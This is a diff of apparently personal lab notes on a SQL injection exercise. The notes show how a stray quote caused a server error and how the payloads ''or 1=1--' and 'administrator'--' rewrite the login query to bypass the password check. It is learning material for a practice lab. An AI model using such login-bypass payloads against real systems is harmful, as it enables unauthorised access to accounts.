@@ -4,6 +4,12 @@ Goal: Perform SQLi attack and login as the administrator
 Analysis:
 admin, admin responds with bad username or password
 ', admin responds with Internal Server Error, May be suspectible to SQL Injection
-SELECT firstname FROM users where username='admin' and pasword ='admin'
-'OR 1=1--, admin, responds with you solved the lab
-administrator'--, had to encode this administrator%27--
+SELECT firstname FROM users where username='admin' and password ='admin'
+
+Injection: 'or 1=1--
+SELECT firstname FROM users where username='' or 1=1--'
+SELECT firstname FROM users where username='' or 1=1
+
+Injection:administrator'--
+SELECT firstname FROM users where username='administrator'--' and password='admin'
+SELECT firstname FROM users where username='administrator'
